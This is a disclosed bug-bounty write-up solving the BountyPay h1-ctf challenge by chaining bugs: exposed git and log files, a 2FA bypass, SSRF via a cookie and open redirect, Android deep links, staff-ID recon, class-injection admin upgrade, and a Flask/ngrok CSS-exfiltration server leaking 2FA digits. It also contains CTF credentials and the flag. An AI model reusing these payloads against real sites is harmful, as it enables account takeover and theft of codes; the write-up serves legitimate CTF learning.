# h1-ctf writeup , finally paid the payments by chaining multiple bugs

## Report Details
- **Report ID**: 894110
- **URL**: https://hackerone.com/reports/894110
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-08T21:35:32.953Z
- **Disclosed**: 2020-06-18T15:28:49.496Z

## Reporter
- **Username**: d1r3wolf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# Summary:
Ultimate aim is to pay the payments of hackerone using bounty pay with no use privileges at starting.
Given scope is : *.bountypay.h1ctf.com

**Enumerated subdomains are :**
  1. www.bountypay.h1ctf.com
  2. app.bountypay.h1ctf.com
  3. staff.bountypay.h1ctf.com
  4. api.bountypay.h1ctf.com
  5. software.bountypay.h1ctf.com (cant access gloabally)

The overall CTF can be divided into levels, at each level we work with one subdomain.
**Lets make the road map to the CTF:**
  1. Login into the **app.bountypay.h1ctf.com** (using **git repo files**, 2FA bypass)
  2. **SSRF** in **load transactions** to access **software.bountypay.h1ctf.com** and getting **BountyPay.apk**
  3. Solving the **three challenges** of Android to get **api key** of **api.bountypay.h1ctf.com**
  4. Recon on the **company twitter** to get the staff_id , finding the creds of **staff.bountypay.h1ctf.com** using that **staff id** and staff details route over **api**
  5. Getting **hackerone** payment creds by **upgrading to admin** using **report feature** and **chaining the logical bugs** over predifined js 
  6. Leaking the **2FA code** by **CSS exfilteration** and bypass 2FA at payments on **app.bountypay.h1ctf.com**
  
# Level - 1 :: 
Started with app.bountypay.h1ctf.com site.
Through dirsearch found the git repo files **/.git/**, downloaded the config file https://app.bountypay.h1ctf.com/.git/config
```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```
Through the config file found the git repo https://github.com/bounty-pay-code/request-logger.git.
The repo is php request logger .
through the [logger.php code](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php)
```php
<?php
$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);
file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
```
 found that it logs the POST and GET variables to the log file **bp_web_trace.log** which is in htdocs and can be accessed through server https://app.bountypay.h1ctf.com/bp_web_trace.log.
```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```
By base64 decoding we can get the first four requests of the server
```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```
Using that creds we can login into the app.bountypay.h1ctf.com which has an 2FA check.
There is no session management, 2FA code is validated using the challenge parameter so 2FA is validated using some relation ship between challenge and challenge_answer.
```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com

username=brian.oliver&password=V7h0inzX&challenge=4810310b2c844799dc9c9d46d3838192&challenge_answer=fake
```
Seems like the `challenge == md5(challenge_answer)`, tried that one `challenge=144c9defac04969c7bfad8efaa8ea194&challenge_answer=fake`
Worked : )    -   Successfully logged into app.app.bountypay.h1ctf.com

# Level - 2 ::
After login into the **app.bountypay.h1ctf.com**, it gives a **dashboard** where we can **load transactions based on month, year and pay them**.
The brian.oliver is the owner of BountyPayHQ , searched for all months and years, no use, there are no payments for that account.
But while loading transactions :
{F859504}
It giving a **url of  api to get the result** and **result data** in the json.
The server is **internally requesting the api** for the result. we can achieve **SSRF** if we have control over the url.
URL : `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=07&year=2020`
There is no use of **month and year values** as they are in the **query part**, but after observing the base64 cookie found that the account id **F8gHiqSdpK** has been taken from **token cookie**.
```
$ echo eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```
As we have control over account_id, the injection is in url path, so we can control path over that domain api.bountypay.h1ctf.com only : (.

After visiting the [home page](https://api.bountypay.h1ctf.com/) found that there is an redirect at https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API
url has an **whitelist check**, but it is accepting https://software.bountypay.h1ctf.com/, which is not accessable globally. 
Tried accessing it using ssrf : F859521
It has a login page same as app.bountypay.h1ctf.com , tried sending post params in get etc, nothing worked.
After that tried directory brute force using that ssrf, found uploads directory on https://software.bountypay.h1ctf.com/. 
```<html>
<head><title>Index of /uploads/</title></head>
<body bgcolor="white">
<h1>Index of /uploads/</h1><hr><pre><a href="../">../</a>
<a href="/uploads/BountyPay.apk">BountyPay.apk</a>                                        20-Apr-2020 11:26              4043701
</pre><hr></body>
</html>
```
Found the apk on the uploads folder, the files has no restrictions for IP. so downloaded it normally https://software.bountypay.h1ctf.com/uploads/BountyPay.apk .  Apk file : F859556

# Level - 3 :: 
Decompiled the Apk into java files
And found that Three challenges in Apk (PartOneActivity.java, PartTwoActivity.java , PartThreeActicity.java).
For each activity there is a deep link, the challenges are just fullfill conditions using deeplinks
```xml
        <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="three" android:host="part"/>
            </intent-filter>
        </activity>
        <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="two" android:host="part"/>
            </intent-filter>
        </activity>
        <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="one" android:host="part"/>
            </intent-filter>
        </activity>
```
## First challenge :
```java
     if (getIntent() != null && getIntent().getData() != null) {
            String firstParam = getIntent().getData().getQueryParameter("start");
            if (firstParam != null && firstParam.equals("PartTwoActivity") && settings.contains(str)) {
```
It just checks there is start param in query on deep link and that param value == PartTwoActivity
Solution : 
```
$ adb shell am start -d one://part?start=PartTwoActivity
```
## Second Challenge 
```java
if (getIntent() != null && getIntent().getData() != null) {
    Uri data = getIntent().getData();
    String firstParam = data.getQueryParameter("two");
    String secondParam = data.getQueryParameter("switch");
    if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on")) {
```
It checks two and switch params must be in query and the values must be `two=light&switch=on`
Solution : 
```
$ adb shell am start -d 'two://part?two=light\&switch=on'
```
After that there is question where it ask for header value and combine it with `X-` and checks with header value of firebase.
From internal files of firebase in apk found the url for firebase https://bountypay-90f64.firebaseio.com/
Then getting the header value in it, https://bountypay-90f64.firebaseio.com/header/.json  `Token` is the value, submit it

## Third Challenge
Where as PartThreeActivity it checks for `three=base64(PartThreeActivity)` and `switch=base64(on)` and `header=X-Token`
Solution : 
```
$ adb shell am start -d 'three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token'
```
To finish this we need google apps in VM, as firebase requires aiuthentication.
It saves the Token and Host values to shared preferences.
```
$ adb shell
root@vbox86p:/ # cat /data/data/bounty.pay/shared_prefs/user_created.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="TWITTERHANDLE"></string>
    <string name="USERNAME">Hello</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
    <string name="PARTTWO">COMPLETE</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
</map>
root@vbox86p:/ # 
```
Now we got the token. we can submit it dialogue box that asks after we launch third activity to make it finish F859607.
From the **performPostCall** function of **PartThreeActivity.java** we can get to know how to use the token
`X-Token: 8e9998ee3137ca9ade8f372739f062c1` as a header for api.bountypay.h1ctf.com


# Level - 4 ::
After getting the api token. crawled over the api recursively and only one useful new route `/api/staff`
```
_______________________________ Request __________________________________
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Connection: close

_______________________________ Response __________________________________
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```
After few trails over that request , found it resonds to POST method , which takes staff_id as input.
If already knows staff_id from GET method is used it is responding as `Staff Member already has an account`
For non existing staff_id's `Invalid Staff ID`

This is most difficult part i faced, didn't expected the recon concept, wasted days over this : (, but i liked it , it is relevant to real life scenario.  
We need a new joining staff_id to create an account.
**Recon part**
Gone to twitter https://twitter.com/BountypayHQ
There is a tweet : `Today we welcome Sandra to the team!!!` it is hint for us.
Searched for following of BountypayHQ in twitter and find sandra twitter account https://twitter.com/SandraA76708114
There she posts a tweet of first day job https://twitter.com/SandraA76708114/status/1258693001964068864.
Where the photo contains the ID card which has an staff_id on it F859634.

**Staff id**: STF:8FJ3KFISL3
with which we can create new account to get staff credentials.
```
_______________________________ Request __________________________________
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Length: 23

staff_id=STF:8FJ3KFISL3
_______________________________ Response __________________________________
 {"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```
It creates a new account and gives the username, password of sandra.
Username: sandra.allison
Password: s%3D8qB8zEpMnc*xsz7Yp5

# Level - 5 :: 
Using those **staff creds** we can login to **staff.bountypay.h1ctf.com**
Through the js file(https://staff.bountypay.h1ctf.com/js/website.js) we can observer there is upgrade to admin concept
```js
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), 
$(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), 
$(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), 
document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```
## Observation-1:
**upgradeToAdmin** is not working for us, **requires admin privilages**.
There is a **report functionality** is dashboard , we might use that to trigger the upgrade functionality on **admin side**.
The report to admin request takes only **path of the url**
```
GET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUV............
```
We have to trigger the upgrade to admin functionality locally only by the url.

Observation-2:
As the **avatar** is linked to the **class names** (avatar1, avatar2, avatar2). our **input for avatar** is **simple a class name**.
So there is an **class injection in avatar**. It supports **multiple classes** as it allows space char.
We can trigger that class injection on `/?template=home` and `/?template=ticket&ticket_id=3582`

Observation - 3:
**upgrade to  admin** function has been linked to on click listner on **upgradeToAdmin class**
Based on last line of website.js
```js
document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```
We can **trigger onclick** using **hash and class names**, as already we have class names in our control for a div.
We can set the **class name** as `tab4 upgradeToAdmin` and **hash** as `#tab4` , which first makes the **div to click** based on **.tab4 class name** 
As the **div also had upgradeToAdmin class**, now it triggers the upgradetoadmin function .

Observation - 4:
```js
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
```
It is taking the **username** from `input[name="username"]`, we need to find that type of gadget in html.
after checking all **templates** , **login template had that gadget**, weirdly there is no check for opening of login template even after loggedin.
we need to **fill the username** field with our disired value only with url, tried with get params https://staff.bountypay.h1ctf.com/?template=login&username=nice , Worked : )

Observation - 5:
But the **login template** didn't have **class injection**, we need both **login, ticket template** to make this happen.
As the template is based on get param, tried giving of multiple templates as array . Worked : )

Finally: 
By combining all
Change the avatar value to `tab4 upgradeToAdmin`
```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUV....

profile_name=sandra&profile_avatar=tab4 upgradeToAdmin
```
Open : https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra&template[]=ticket&ticket_id=3582#tab4
Observer the traffic, it automatically sends the upgrade to admin request . Now time to report it to admin.
```
$ echo -n "/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4" | base64
Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlj
a2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=
```
Visit the URL : https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=

It gives the new admin tab to the dashbaord.
{F859704}
Which contains passwords of bounty pay accounts. now we got the username and password of hackerone's bountypay account.
```
Username: marten.mickos
Password : h&H5wy2Lggj*kKn4OD&Ype
```

# Level - 6 ::
 Now we can login to hackerone's bounty pay account using those creds on **app.bountypay.h1ctf.com**, using 2FA bypass trich , that we did on level -1
Load the **transaction of May 2020**, we need to **pay them** in order to **finish the challellege**.
Payment : https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
To pay there is an send challenge option. Which sends code to 2FA app. that request also takes `app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css`
By changing the value, we can load **our style** for that 2FA code. Now our aim is to leak the **7 digit 2FA** code using **CSS exfilteration**.

After some trails with **tag names** using **responsive nature of css** (background image), tried **input** tag. It responded with **7 requests**.
Now tried to brute force the **input tag's name **. Upto `code_` there comes only **one request**.
After that it responded with **1 to 7 values**. then got to understand the **pattern of input name** like code_1, code_2, code_3, code_4, code_5, code_6, code_7.
We need to **leak all those seven codes**. As there is **each input for each code**. it became quite simple for bruteforce.
## Final payload server using ngrok.
```python
from flask import *
from flask_cors import CORS, cross_origin
from requests import *

app = Flask(__name__,static_folder='')
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'

@cross_origin()
@app.route("/css/final.css")
def css_file():
	return app.send_static_file("check.css")

record_file="/tmp/record_%s.txt"

@app.route("/recieve")
@cross_origin()
def recieve():
	char = request.args.get('char') ; place = request.args.get('place')
	print(place,' - ',char)
	return "Done"

def set_payload(payload):
	final = open("check.css",'a+'); string =""
	PP = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[]^_`{|}~ "
	for p in PP:
		string += str(payload).replace("$$",p).replace("||",str(ord(p)))
	final.write(string)
	final.close()

ngrok_url = "https://87dc2cffc13b.ngrok.io"
payload = '''
input[name^="code_!!"][value="$$"] {
	background-image:url("%s/recieve?value=||&char=$$&place=!!");
}
'''%ngrok_url

if __name__ == '__main__':
	with open("check.css",'w') as F: pass
	for i in range(1,8):
		temp = payload.replace('!!',str(i))
		set_payload(temp)
	app.run()
```
Just **intercept** the request of **send_challenge (send 2FA)** and **change the app_style** to https://87dc2cffc13b.ngrok.io/css/final.css.
From **python server log** we can get the **7 digits**, we need to **combine and enter on the site**. we have enough time for this [**2 min**]
**Boom : )**

# Proof of concept
Here is the flag : ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$
Screenshot : F859448

## Impact

Access over payments account.

## Attachments
- Screenshot_from_2020-06-08_23-04-12.png
- Screenshot_from_2020-06-09_00-07-18.png
- Screenshot_from_2020-06-09_00-22-24.png
- BountyPay.apk
- andriod_challenges_solved.jpg
- sandra_first_day_pic.jpeg
- Screenshot_from_2020-06-09_02-26-29.png
